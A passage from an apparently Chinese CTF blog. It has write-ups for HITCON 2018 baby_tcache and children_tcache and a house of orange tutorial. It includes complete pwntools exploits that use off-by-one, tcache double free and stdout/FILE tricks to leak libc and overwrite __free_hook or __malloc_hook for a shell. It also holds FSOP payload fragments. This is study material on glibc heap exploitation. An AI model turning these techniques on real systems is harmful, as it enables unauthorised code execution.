overwrite修改最低两个字节，因为有半个字节无法确定，所以先随意确定一个值，通过多次运行使内存中真实值与我们确定的值发生碰撞。这里我将stdout-&gt;_IO_write_base最低位字节设置为\x08，因为刚好从该地址开始的8个字节为libc中的一个地址。1234567891011121314151617181920212223dele(1) #b2进入tcache || remain 0add_7_times(0x80)add(0x80, 'b1') #add 8del_7_times(1, 8) #remain 0 8#此时topchunk与b2重叠add_7_times(0x120)add(0x120, 'xxxx') #add 9 || 在b2处创建一个smallchunkdel_7_times(1, 8) #remain 0 8 9add(0x1000, 'xxxx') #add 1 || 防止topchunk合并dele(9) #remain 0 1 8 || 将smallchunk又释放掉，获得一个指向libc内部的fd指针add(0x50, '\x60\xa7') #add 2 || 再在b2处分配一个chunk，并partial overwrite改写fd指针，这个因为_IO_2_1_stdout_的最低3个16进制位为0x760，所以先随意确定该值为0xa760。add(0x210, 'xxxx') #add 3 || 从tcache中又将b2分配出来，此时_IO_2_1_stdout_的地址将位于tcache中payload = p64(0xfbad1800)+p64(0)*3+"\x08"add(0x210, payload) #add 4 || remain 0 1 2 3 4 8 || 在_IO_2_1_stdout_处分配chunk，然后修改其中的变量值#泄漏libclibc_base = u64(p.recvline()[:8]) - 0x3ED8B0print "libc_base : %#x" % libc_basefree_hook = libc_base + libc.symbols['__free_hook']one_gadget = libc_base + 0x4f322getshell在泄露出libc的地址后，接下来的事情就简单多了。因为在上面代码中，索引为2和3的chunk实际都为chunk_b2，所以可以通过tcache中的double free来再次修改fd值，实现在__free_hook处分配chunk，并写入one_gadget。1234567#3和2都是chunk_b2，double freedele(3)dele(2)add(0x50, p64(free_hook)) #修改fd为free_hookadd(0x50, 'xxxx') add(0x50, p64(one_gadget)) #将free_hook修改为onegadgetdele(0)我的EXP本地环境: Ubuntu 18.04.1 LTS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# coding=utf-8from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p=process('./baby_tcache')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(size, content): p.recvuntil('Your choice: ') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Data:') p.send(content)def dele(index): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def add_7_times(size): for _ in range(7): add(size, 'xxxx')def del_7_times(begin, end): for i in range(begin, end): dele(i)def main(): add_7_times(0x80) del_7_times(0, 7) add_7_times(0x120) del_7_times(0, 7) add_7_times(0x200) add(0x208, 'A') #7 add(0x200, 'B') #8 add(0x200, 'C') #9 del_7_times(0, 7) dele(8) dele(7) #remain 9 add(0x108, 'A'*0x108) #remain 0 9 || 创建了一个last_remainder add_7_times(0x80) add(0x80, 'b1') #remain 0 (1-7) 8 9 del_7_times(1, 8) add(0x210, 'b2') #add 1 || remain 0 1 8 9 || 将被overlap的chunk dele(8) dele(9) #overlap dele(1) #b2进入tcache || remain 0 add_7_times(0x80) add(0x80, 'b1') #add 8 del_7_times(1, 8) #remain 0 8 #此时topchunk与b2重叠 add_7_times(0x120) add(0x120, 'xxxx') #add 9 || 在b2处创建一个smallchunk del_7_times(1, 8) #remain 0 8 9 add(0x1000, 'xxxx') #add 1 || 防止topchunk合并 dele(9) #remain 0 1 8 || 将smallchunk又释放掉，获得一个指向libc的fd指针 add(0x50, '\x60\xa7') #add 2 || 再在b2处分配一个chunk，并partial overwrite改写fd指针 add(0x210, 'xxxx') #add 3 || 从tcache中又将b2分配出来，_IO_2_1_stdout_的地址位于tcache中 payload = p64(0xfbad1800)+p64(0)*3+"\x08" add(0x210, payload) #add 4 || remain 0 1 2 3 4 8 || 在_IO_2_1_stdout_处分配chunk，然后修改其中的变量值 #泄漏libc libc_base = u64(p.recvline()[:8]) - 0x3ED8B0 print "libc_base : %#x" % libc_base free_hook = libc_base + libc.symbols['__free_hook'] one_gadget = libc_base + 0x4f322 #3和2都是b2,double free dele(3) dele(2) add(0x50, p64(free_hook)) #修改fd为free_hook add(0x50, 'xxxx') add(0x50, p64(one_gadget)) #将free_hook修改为onegadget dele(0)if __name__ == '__main__': while(True): try: main() # gdb.attach(p) p.interactive() p.close() break except: p.close() p = process('./baby_tcache')相关链接二进制文件：baby_tcachewriteup参考：https://vigneshsrao.github.io/babytcache/https://znqt.github.io/hitcon2018-babytcache/]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>overlapping</tag>
        <tag>off_by_one</tag>
        <tag>tcache</tag>
        <tag>IO_FILE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2018 children_tcache writeup && overlapping]]></title>
    <url>%2Fpost%2Fcdad9cf7.html</url>
    <content type="text"><![CDATA[第一次参加HITCON CTF，之前在学堆利用的时候倒是做过几道往年的题，自我感觉还挺不错的，结果就爆零了23333。前几天就在网上看到了这题的writeup，一直拖到今天才拿来学习了一波，看完感觉自己是真的菜。。。题目描述题目来源：HITCON CTF 2018知识点：tcache &amp;&amp; overlapping &amp;&amp; off_by_one题目界面：123456789$$$$$$$$$$$$$$$$$$$$$$$$$$$🍊 Children Tcache 🍊$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 1. New heap $$ 2. Show heap $$ 3. Delete heap $ $ 4. Exit $ $$$$$$$$$$$$$$$$$$$$$$$$$$$Your choice:保护全开：123456Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabledFORTIFY: Enabled漏洞情况new_heap函数中:1234567891011121314 printf("Size:"); size = get_num(); if ( size &gt; 0x2000 ) exit(-2); dest = (char *)malloc(size); if ( !dest ) exit(-1); printf("Data:"); get_str((__int64)&amp;s, size); strcpy(dest, &amp;s); data_list[i] = dest; size_list[i] = size; return __readfsqword(0x28u) ^ v5;&#125;因为strcpy函数在拷贝字符串时，最后的’\0’也会一起拷贝，所以当输入的字符串已经占满了所分配的内存，那最后的’\0’会往后溢出一个字节，导致了null byte off_by_one。看到null byte off_by_one，我首先就想到构造chunk overlapping，然而太菜。不够熟悉tcache以及overlap，所以到最后也没做出来笔记这题目其实不难，前面一部分都是标准的overlaping的流程，只是因为多了tcache，所以要不停的填充和清空tcache，来保证我们的chunk不受它的影响。真正利用tcache的地方只有最后的double free(tcache dup)。为了省时间就不单独分析了，直接写在exp里，赶作业要紧。。。。。补充 overlapping(2018-11-03)今天在发现这题还有一个要点我没注意到！！！！overlapping新姿势！！！(对我来说足够新2333)，所以回来补充一下overlapping常规先回顾一下常规overlapping可以看到，如果要通过null byte off_by_one构造overlapping，首先需要伪造chunk_C的prevsize(如上图第二步)，否则在分配b1的时候会corrupted size vs. prev_size。新姿势查看malloc源码可以发现，corrupted的原因在于从unsortedbin中取出chunk时会调用unlink，正是unlink中的检查导致了错误。12345678910111213else &#123; // 获取对应victim的大小 size = chunksize(victim); /* We know the first chunk in this bin is big enough to use. */ assert((unsigned long) (size) &gt;= (unsigned long) (nb)); // 计算分割后剩余的大小 remainder_size = size - nb; /* unlink */ unlink(av, victim, bck, fwd); ...&#125;而该题目在free时，会将整个chunk全部填充为0xda，所以没有办法伪造prevsize。所以该题利用过程中使用了采用了一种不需要伪造prevsize的技巧。在执行malloc时，若fastbin和smallbin中没有合适的chunk，并且请求为small chunk的话，将会首先考虑使用last_remainder。如果last_remainder是unsorted bin中的唯一一块，并且last_remainder的大小分割够还可以作为一个 chunk，那么就会从last_remainder中分割下合适大小的块。而从last_remainder分割chunk的话就不会使用到unlink，从而成功分配1234567891011121314151617181920212223242526272829303132/* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk.*/if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))&#123; /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); if (!in_smallbin_range (remainder_size)) &#123; remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; &#125; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;&#125;所以只要能把chunk_B作为last_remainder一切就简单了。详见wpexp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697# -*- coding:utf-8 -*-from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']#context.log_level = 'debug'elf = ELF('./children_tcache')libc = ELF('./libc.so.6')p = process('./children_tcache', env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;)def add(size, content): p.recvuntil('Your choice: ') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Data:') p.send(content)def show(index): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def dele(index): p.recvuntil('Your choice: ') p.sendline('3') p.recvuntil('Index:') p.sendline(str(index))def add_7_times(size): for _ in range(7): add(size, 'xxxx')def del_7_times(fr, to): for i in range(fr, to): dele(i)#现在堆的前面把这些用于填充tcache的chunk分配好，以免破坏后面堆的布局add_7_times(0x80) #0-6del_7_times(0, 7)add_7_times(0x100) #0-6，填充tcache 0x110add(0x108, '7777') #7 chunk_Aadd(0x100, '8888') #8 chunk_Badd(0x100, '9999') #9 chunk_Cdel_7_times(0, 7)dele(8) #释放chunk_B，tcache已满，放入unsortedbindele(7) #释放chunk_A，A和B会合并(重要)add_7_times(0x100) #0-6add(0x108, '7'*0x108) #7 从合并的chunk中又取回chunk_A，同时创建了last_remainder(重要)#同时通过溢出(null byte off_by_one)修改了chunk_B的size(0x110--&gt;0x100)，del_7_times(0, 7)add_7_times(0x80)add(0x80, '8888') #8 chunk_b1 从chunk_B(last_remainder)中分割下来，因为size被改，所以chunk_C的prevsize得不到维护#此处如果不是从last_remainder中分割就会出错！！！！del_7_times(0, 7)add(0x60, 'aaaa') #0 chunk_b2 将chunk_B剩下部分都取出来，chunk_C的prvesize同样没有被维护dele(8) #释放b1dele(9) #overlap!!触发从chunk_b1到topchunk的合并，其中包含了未被释放的chunk_b2 #topchunk位于chunk_b1的位置。add_7_times(0x80) #1-6 8add(0x80, 'xxxx') #9，重新分配chunk_b1，现在topchunk和chunk_b2重合del_7_times(1, 7) #回填tcache 0x90dele(8) #回填tcache 0x90，剩0(chunk_b2) 7(chunk_A) 9(chunk_b1)add(0x500, '1111') #1，该chunk和0重合add(0x120, '2222') #2，防止被topchunk合并dele(1)show(0)#泄漏libclibc_base = u64(p.recvline()[:-1].ljust(8, '\x00')) - 0x3ebca0print "libc_base: %#x" % libc_basemalloc_hook = libc.symbols['__malloc_hook'] + libc_baseprint "malloc_hook: %#x" % malloc_hookone_gadget = libc_base + 0x10a38cprint "one_gadget: %#x" % one_gadgetadd(0x120, '1111') #1 从0x500大小的chunk中分割出0x120。0和1都指向该chunkdele(0) #放入tcachedele(1) #再次放入tcache，double freeadd(0x120, p64(malloc_hook)) #修改fd为malloc_hookadd(0x120, 'aaaa') add(0x120, p64(one_gadget)) #修改malloc_hook为one_gadgetp.recvuntil('Your choice: ') #getshellp.sendline('1')p.recvuntil('Size:')p.sendline('123')p.interactive()相关链接题目链接：children_tcacheexp参考：HITCON2018-WP-By Nu1L]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
        <tag>overlapping</tag>
        <tag>off_by_one</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆利用学习之house of orange]]></title>
    <url>%2Fpost%2Ff8f8701e.html</url>
    <content type="text"><![CDATA[终于学到了house of orange，看了无数师傅的博客，终于马马虎虎理清了一点思路，还是得写点笔记以免忘掉。概述house of orange是来自Hitcon CTF 2016中的一道同名题目，其中使用了一种全新的攻击手段（现在也不新了2333），攻击的主要思路是利用unsorted attack修改_IO_list_all指针，并伪造_IO_FILE_plus结构体及其vtable（虚表）来劫持控制流。直接上题目好了。。。题目描述程序菜单：123456789+++++++++++++++++++++++++++++++++++++@ House of Orange @+++++++++++++++++++++++++++++++++++++ 1. Build the house 2. See the house 3. Upgrade the house 4. Give up +++++++++++++++++++++++++++++++++++++Your choice :程序保护全开_(:зゝ∠)_:12345CANARY : ENABLEDFORTIFY : ENABLEDNX : ENABLEDPIE : ENABLEDRELRO : FULL程序分析build函数：用户输入house的名字、orange的颜色和价格，并使用两个结构体保存。结构体：123400000000 house struc ; (sizeof=0x10, mappedto_6)00000000 orange dq ?00000008 name dq ?00000010 house ends123400000000 orange struc ; (sizeof=0x8, mappedto_7)00000000 price dd ?00000004 color dd ?00000008 orange ends限制了只能build四次，每次build会申请3个chunk，其中只有第二个chunk(house name)可以控制大小，且最大为0x10001234567891011121314house = (house *)malloc(0x10uLL);printf("Length of name :");size = get_num();if ( size &gt; 0x1000 ) size = 4096;house-&gt;name = (__int64)malloc(size);if ( !house-&gt;name )&#123; puts("Malloc error !!!"); exit(1);&#125;printf("Name :");get_str((void *)house-&gt;name, size);orange = (orange *)calloc(1uLL, 8uLL);upgrade函数：修改house的name、orange的颜色和价格，只能修改最近build的house。123456printf("Length of name :");v2 = get_num();if ( v2 &gt; 0x1000 ) v2 = 4096;printf("Name:");get_str((void *)qword_203068[1], v2);修改name的地方没有检查size的大小，所以存在堆溢出see函数打印house的名字、orange的价格等，同样只能打印最近build的house。漏洞分析泄露libc基址和堆地址发现程序中没有free函数，导致常规的堆利用方法都很难使用，这便是house of orange的核心之一——在没有free函数的情况下得到一个释放的堆块（unsorted bin），从而泄露数据。原理考虑这么一种情况，假设在malloc时，程序中的bins里都没有合适的chunk，同时top chunk的大小已经不够用来分配这块内存了。那么此时程序将会调用sysmalloc来向系统申请更多的空间，而我们的目的则是在sysmalloc中的_int_free()，以此来获得一块释放的堆块。1234567else&#123; void *p = sysmalloc (nb, av); //调用sysmalloc来分配内存 if (p != NULL) alloc_perturb (p, bytes); return p;&#125;对于堆来说有两种拓展方式，一是通过改变brk来拓展堆，二是通过mmap的方式。其中只有brk拓展的方式才会调用到_int_free()将老的top chunk释放掉，所以还需要满足一些条件。123456789// 如果所需分配的chunk大小大于mmap分配阈值，默认为128K，// 并且当前进程使用mmap()分配的内存块小于设定的最大值// 则将使用mmap()if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123; //使用mmap() &#125;由上诉代码可知，要想使用brk拓展，需要满足chunk size &lt; 0x‭20000‬同时，在使用brk拓展之前，还会进行一系列check。12345678// 如果top chunk没有初始化，则size为0// top chunk的大小需要 &gt;= MINSIZE(有师傅的博客说在64位下是0x20)// top chunk的inuse位需要是 1// 检查是否对齐到内存页assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; pagemask) == 0));这里主要关注如何对齐到内存页。现代操作系统都是以内存页为单位进行内存管理的，一般内存页大小为4kb(0x1000)，那么top chunk的size加上top chunk的地址所得到的值是和0x1000对齐的。如：0x602020+0x20fe0=0x623000。整理以上代码，所需的条件有：分配的chunk大小小于0x‭20000，大于top chunk‬的sizetop chunk大小大于 MINSIZE（不能太小就行）top chunk的inuse为 1top chunk的大小要对齐到内存页满足了以上各种条件之后，就可以成功的调用_int_free()来释放top chunk12345/* If possible, release the rest. */if (old_size &gt;= MINSIZE)&#123; _int_free (av, old_top, 1);//调用_int_free，free old_top。&#125;此后，原先的top chunk将被放入unsorted bin中。下一次分配时，就将会从unsorted bin中切割合适的大小，而切割下来的chunk的fd和bk的值将会是libc中的地址了，同时，若该chunk是large chunk，在fd_nextsize和bk_nextsizez中还会储存堆中的地址。由此便可以完成泄露了。利用过程先build一个house，通过upgrade从name溢出到top chunk，将top chunk的大小改为0xfa1（name chunk的大小为0x20）123build(0x10, 'aaaa')payload = 'a'*0x18 + p64(0x21) + p64(0)*3 + p64(0xfa1)upgrade(0x100, payload)12345678//内存情况：0x55e0ebd68000: 0x0000000000000000 0x0000000000000021 &lt;== house0x55e0ebd68010: 0x000055e0ebd68050 0x000055e0ebd680300x55e0ebd68020: 0x0000000000000000 0x0000000000000021 &lt;== name0x55e0ebd68030: 0x6161616161616161 0x61616161616161610x55e0ebd68040: 0x6161616161616161 0x0000000000000021 &lt;== orange0x55e0ebd68050: 0x0000001f00000008 0x00000000000000000x55e0ebd68060: 0x0000000000000000 0x0000000000000fa1 &lt;== top chunk申请一个大于top chunk的空间，触发brk来拓展top chunk。原top chunk将会被放入unsorted bin1build(0x1000, 'aaaa')1234//内存情况：//因为我不是同一次运行，地址可能和前面不匹配unsortedbinall: 0x7f7ab34f37b8 (main_arena+88) —▸ 0x5598255700a0 ◂— 0x7f7ab34f37b8再申请一个大小合适的large chunk，该chunk将会从unsorted bin中切割下来。1build(0x400, 'a'*0x8)123456//内存情况：pwndbg&gt; x/32gx 0x559d1a1d40c00x559d1a1d40c0: 0x0000000000000000 0x00000000000004110x559d1a1d40d0: 0x6161616161616161 0x00007f732b8fddc8 &lt;== libc0x559d1a1d40e0: 0x0000559d1a1d40c0 0x0000559d1a1d40c0 &lt;== heap0x559d1a1d40f0: 0x0000000000000000 0x0000000000000000调用see()，输出name时，将会把libc的地址泄露出来。再调用upgrade()，把bk也全部填充为’a’，那么下一次see()就可以泄露出heap的地址。劫持流程接下来将会涉及到IO_FILE的利用，这种方法被称为FSOP(File Stream Oriented Programming)FILE介绍FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流。FILE结构在程序执行fopen等函数时会进行创建。每个FILE结构都通过一个 _IO_FILE_plus结构体来定义，结构体如下：12345struct _IO_FILE_plus&#123; _IO_FILE file; const struct _IO_jump_t *vtable;&#125;;其中包括一个_IO_FILE结构体和一个vtable(虚表)指针。_IO_FILE结构体保存了FILE的各种信息。vtable(虚表)指针指向了一系列函数指针，稍后就会用到其中的函数。_IO_FILE结构定义如下：123456789101112131415161718192021222324252627282930313233343536373839404142struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;整个结构不用完全掌握，大概了解就行。在进程中的产生的各个_IO_FILE结构会通过其中的struct _IO_FILE *_chain;连接在一起形成一个链表，其中表头使用全局变量struct _IO_FILE_plus *_IO_list_all来表示，通过_IO_list_all就可以遍历所有_IO_FILE结构。_IO_jump_t *vtable结构定义如下:1234567891011121314151617181920212223242526272829struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);#if 0 get_column; set_column;#endif&#125;;这里面保存了一系列的函数指针。以上，主要需要了解的就是 _IO_FILE_plus、_IO_FILE、vtable3个结构以及 _IO_list_all指针的关系和及其内容。_IO_FILE各个成员的偏移如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667_IO_FILE_plus = &#123; 'i386':&#123; 0x0:'_flags', 0x4:'_IO_read_ptr', 0x8:'_IO_read_end', 0xc:'_IO_read_base', 0x10:'_IO_write_base', 0x14:'_IO_write_ptr', 0x18:'_IO_write_end', 0x1c:'_IO_buf_base', 0x20:'_IO_buf_end', 0x24:'_IO_save_base', 0x28:'_IO_backup_base', 0x2c:'_IO_save_end', 0x30:'_markers', 0x34:'_chain', 0x38:'_fileno', 0x3c:'_flags2', 0x40:'_old_offset', 0x44:'_cur_column', 0x46:'_vtable_offset', 0x47:'_shortbuf', 0x48:'_lock', 0x4c:'_offset', 0x54:'_codecvt', 0x58:'_wide_data', 0x5c:'_freeres_list', 0x60:'_freeres_buf', 0x64:'__pad5', 0x68:'_mode', 0x6c:'_unused2', 0x94:'vtable' &#125;, 'amd64':&#123; 0x0:'_flags', 0x8:'_IO_read_ptr', 0x10:'_IO_read_end', 0x18:'_IO_read_base', 0x20:'_IO_write_base', 0x28:'_IO_write_ptr', 0x30:'_IO_write_end', 0x38:'_IO_buf_base', 0x40:'_IO_buf_end', 0x48:'_IO_save_base', 0x50:'_IO_backup_base', 0x58:'_IO_save_end', 0x60:'_markers', 0x68:'_chain', 0x70:'_fileno', 0x74:'_flags2', 0x78:'_old_offset', 0x80:'_cur_column', 0x82:'_vtable_offset', 0x83:'_shortbuf', 0x88:'_lock', 0x90:'_offset', 0x98:'_codecvt', 0xa0:'_wide_data', 0xa8:'_freeres_list', 0xb0:'_freeres_buf', 0xb8:'__pad5', 0xc0:'_mode', 0xc4:'_unused2', 0xd8:'vtable' &#125;&#125;[注]在gdb中查看这些结构的指令:123456//查看_IO_list_all指针p *_IO_list_all//查看_IO_FILE_plusp (*(struct _IO_FILE_plus *) 0x55cdf66034f0)//查看vtablep (*(struct _IO_jump_t *) 0x55cdf66034f0)unsortedbin attack根据house of orange的流程，接下来将要控制_IO_list_all指针的值，具体原因后面会讲到。这里我们采用unsortedbin attack来对它的值进行修改。原理在从unsorted bin中取出chunk时，会执行以下代码：12345 bck = victim-&gt;bk; .../* remove from unsorted list */ unsorted_chunks(av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks(av);这里将最后一个chunk取出，并把倒数第二个chunk的fd设置为unsorted_chunks(av)，这里unsorted_chunks(av)就是main_arena中top成员变量的地址(&amp;main_arena+88)。123456789101112131415//main_arena的结构struct malloc_state&#123; mutex_t mutex; int flags; mfastbinptr fastbinsY[NFASTBINS]; mchunkptr top; //此处的地址将被写入目标地址 mchunkptr last_remainder; ...&#125;可以发现，如果我们将victim的bk改写为某个地址，则可以向这个地址 + 0x10的地方写入&amp;main_arena+88。因为题目程序中存在堆溢出，所以可以轻松溢出到某个chunk的bk，并将它改写。这里我们写入_IO_list_all - 0x10，这样当从unsorted bin中取出它时，就可以成功将_IO_list_all写为&amp;main_arena+88。具体利用过程需要和后面FSOP配合。FSOP漏洞原理因为_IO_FILE结构使用链表的结构管理，表头由_IO_list_all维护。所以FSOP的核心思想就是劫持_IO_list_all的值并伪造链表和其中的_IO_FILE在此之前，我们先了解一下malloc对错误信息的处理过程.在malloc出错时，会调用malloc_printerr函数来输出错误信息12if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)|| __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, "malloc(): memory corruption", chunk2mem (victim), av);而malloc_printerr又会调用__libc_message;__libc_message又调用abort;abort则又调用了_IO_flush_all_lockp最后_IO_flush_all_lockp中会调用到vtable中的_IO_OVERFLOW函数整个流程如下图：所以如果可以控制_IO_list_all的值，同时够伪造一个_IO_FILE及其vtable并放入FILE链表中，就可以让上述流程进入我们伪造的vtable, 并调用被修改为system的_IO_OVERFLOW函数。但是想要成功调用_IO_OVERFLOW函数还需要绕过一些阻碍12345678910111213141516171819int _IO_flush_all_lockp (int do_lock)&#123; ... fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) &#123; ... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) ... ... fp = fp-&gt;_chain; &#125;&#125;观察代码发现，_IO_OVERFLOW存在于if之中，根据短路原理，若要执行到_IO_OVERFLOW，就需要让前面的判断都能满足，即：12fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base或者123_IO_vtable_offset (fp) == 0&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base）以上两个条件至少要满足一个，这里我们将选择第一个，只需要构造mode、_IO_write_ptr和_IO_write_base。因为这些都是我们可以伪造的_IO_FILE中的数据，所以比较容易实现。漏洞利用在前面已经介绍过，可以通过unsortedbin attack来将_IO_list_all指针的值修改为&amp;main_arena+88。但这还不够，因为我们很难控制main_arena中的数据，并不能在mode、_IO_write_ptr和_IO_write_base的对应偏移处构造出合适的值。所以我们将目光转向_IO_FILE的链表特性。在前文_IO_flush_all_lockp函数的代码最后，可以发现程序通过fp = fp-&gt;_chain不断的寻找下一个_IO_FILE。所以如果可以修改fp-&gt;_chain到一个我们伪造好的_IO_FILE的地址，那么就可以成功实现利用了。巧妙的是，_IO_FILE结构中的chian字段对应偏移是0x68，而在&amp;main_arena+88对应偏移为0x68的地址正好是大小为0x60的small bin的bk，而这个地址的刚好是我们可以控制的。1234567891011121314151617+0x00 [ top | last_remainder ]+0x10 [ unsorted bin fd | unsorted bin bk ]+0x20 [ smallbin 0x20 fd | smallbin 0x20 bk ]+0x30 [ smallbin 0x30 fd | smallbin 0x30 bk ]+0x40 [ smallbin 0x40 fd | smallbin 0x40 bk ]+0x50 [ smallbin 0x50 fd | smallbin 0x50 bk ]+0x60 [ smallbin 0x60 fd | smallbin 0x60 bk ]pwndbg&gt; x/64gx _IO_list_all0x7fdd7442c7b8 &lt;main_arena+88&gt;: 0x00005616d200b010 0x00005616d1fe94f00x7fdd7442c7c8 &lt;main_arena+104&gt;: 0x00005616d1fe94f0 0x00007fdd7442d1900x7fdd7442c7d8 &lt;main_arena+120&gt;: 0x00007fdd7442c7c8 0x00007fdd7442c7c80x7fdd7442c7e8 &lt;main_arena+136&gt;: 0x00007fdd7442c7d8 0x00007fdd7442c7d80x7fdd7442c7f8 &lt;main_arena+152&gt;: 0x00007fdd7442c7e8 0x00007fdd7442c7e80x7fdd7442c808 &lt;main_arena+168&gt;: 0x00007fdd7442c7f8 0x00007fdd7442c7f80x7fdd7442c818 &lt;main_arena+184&gt;: 0x00005616d1fe94f0 0x00005616d1fe94f0 &lt;== 此处0x7fdd7442c828 &lt;main_arena+200&gt;: 0x00007fdd7442c818 0x00007fdd7442c818我们如果通过溢出，将位于unsorted bin中的chunk的size修改为0x60。（注：现在unsorted bin中的chunk就是之前被释放的top chunk的一部分）那么在下一次malloc的时候，因为在其他bin中都没有合适的chunk，malloc将会进入大循环，把unsorted bin中的chunk放回到对应的small bin或large bin中（具体流程参考ctfwiki）因此，我们修改过size的chunk就会被放入大小为0x60的small bin中，同时，该small bin的fd和bk都会变为此chunk的地址。这样，当_IO_flush_all_lockp函数通过fp-&gt;_chain寻找下一个_IO_FILE时，就会寻找到smallbin 0x60中的chunk。只要在这个chunk中伪造好_IO_FILE结构体以及vtable，把_IO_OVERFLOW设置为system，然后就可以成功getshell了。利用过程直接构造payload首先是padding，抵达被释放掉的top chunk。1payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(1) + p32(0x1f) + p64(0)接下来构造的内存具有双重身份，一是作为伪造的_IO_FILE；一是用于unsorted attack的victim chunk，因为它位于unsorted bin中。然后开始构造_IO_FILE。因为要调用的_IO_OVERFLOW (fp, EOF)被修改后为system(fp)，所以在开头写入&#39;/bin/sh\x00&#39;，让fp = 